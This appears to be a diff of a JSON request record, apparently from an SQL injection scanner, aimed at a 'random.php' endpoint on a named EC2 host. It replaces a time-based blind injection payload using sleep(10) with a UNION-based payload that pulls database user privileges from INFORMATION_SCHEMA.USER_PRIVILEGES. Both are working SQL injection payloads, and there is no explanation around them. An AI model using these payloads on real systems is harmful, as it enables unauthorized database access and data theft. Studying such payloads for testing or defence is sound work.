@@ -2,7 +2,7 @@
   {
     "params": {
       "GET": {
-        "randomed": "(select*from(select(sleep(10)))a)"
+        "randomed": "-3870 UNION ALL SELECT 3406,3406,(SELECT CONCAT(0x10,IFNULL(CAST(grantee AS CHAR),0x20),0x10) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1),3406,3406--"
       }
     },
     "url": "http://ec2-52-221-181-5.ap-southeast-1.compute.amazonaws.com:8080/random.php?randomed",
